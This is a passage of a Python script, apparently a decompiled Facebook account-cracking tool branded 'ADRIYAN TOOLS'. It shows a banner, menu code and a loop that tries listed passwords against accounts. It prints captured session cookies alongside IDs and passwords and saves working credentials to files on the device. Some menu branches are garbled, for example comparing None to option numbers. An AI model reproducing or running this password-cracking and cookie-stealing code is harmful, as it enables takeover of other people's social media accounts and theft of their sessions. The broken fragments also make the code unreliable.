...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdghttps://www.facebook.com/meri.jan.ummmah')
        return None
    if None == '3':
        os.system('xdg-https://www.facebook.com/meri.jan.ummmah ')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/meri.jan.ummmah')
        return None
...
\033[1;37m================= \33[32;45mADRIYAN\33[0;m =====================
\033[1;32m     \033[1;33mOwner BY\33[0;m   :  ADRIYAN
\033[1;32m     \033[1;32mFACEBOK      : Md.Taifur Rahaman
\033[1;32m     \033[1;35mYoutube       :  Nai
\033[1;32m     \033[1;36mTOOL STATUS  : TOOL IS FREE
\033[1;32m     \033[1;35mTEAM         : Toxic Adriyan
\033[1;32m     \033[1;36mTOOL VIRSION : 2.4
\033[1;37m================= \33[32;45mMR\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO ADRIYAN TOOLS\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(ADRIYAN-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ADRIYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(ADRIYAN-CP•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ADRIYAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[ADRIYAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
